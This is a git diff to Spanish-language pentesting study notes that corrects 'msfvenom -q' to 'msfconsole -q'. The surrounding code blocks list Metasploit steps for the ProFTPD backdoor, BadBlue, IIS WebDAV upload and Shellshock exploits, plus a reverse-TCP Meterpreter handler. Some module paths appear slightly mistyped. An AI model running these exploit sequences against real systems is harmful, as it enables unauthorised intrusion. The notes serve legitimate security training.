@@ -6,7 +6,7 @@ Tags: #Metasploit #WebDav #BadBlue #SMB #BlueKeep #Samba #EternalBlue #FTP #HFS
 
 ```bash 
 # Explotaremos la vulnerabilidad de Ftpd -> Proftpd versiones: (1.3.3c)
-❯ msfvenom -q                  # q = Quitar el banner de inicio
+❯ msfconsole -q                  # q = Quitar el banner de inicio
 
 	❯ use exploit/unix/ftp/proftpd_133c_backdoor          # Usamos el exploit                
 	❯ options
@@ -33,7 +33,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 
 ```bash 
 # Explotaremos la vulnerabilidad badblue 2.7
-❯ msfvenom -q                  # q = Quitar el banner de inicio
+❯ msfconsole -q                  # q = Quitar el banner de inicio
 
 	❯ use exploit/windows/http/badblue_ext_passthruerflow         # Usamos el exploit                
 	❯ options
@@ -57,7 +57,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 
 ```bash 
 # Si ya tenemos un archivo malicioso hecho en msfvenom listo para ejecutar en el servidor victima, podemos hacer lo siguiente y nos pondriamos en 'listening'
-❯ msfvenom -q                  # q = Quitar el banner de inicio
+❯ msfconsole -q                  # q = Quitar el banner de inicio
 
 	❯ use multi/handler                 
 	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
@@ -69,7 +69,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 
 ```bash 
 # Nos proveera una sesion de Meterpreter en un Webdav
-❯ msfvenom -q                     # q = Quitar el banner de inicio
+❯ msfconsole -q                     # q = Quitar el banner de inicio
 
 	❯ search iis upload                                  # Buscamos el exploit a usar
 	❯ use exploit/windows/iss/iss_webdav_upload_asp	   # Usamos el exploit
@@ -87,7 +87,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 
 ```bash 
 # Explotaremos la vulnerabilidad de Shellshock
-❯ msfvenom -q                  # q = Quitar el banner de inicio
+❯ msfconsole -q                  # q = Quitar el banner de inicio
 
 	❯ use exploit/multi/http/apache_mod_cgi_bash_env_exec                 
 	❯ options
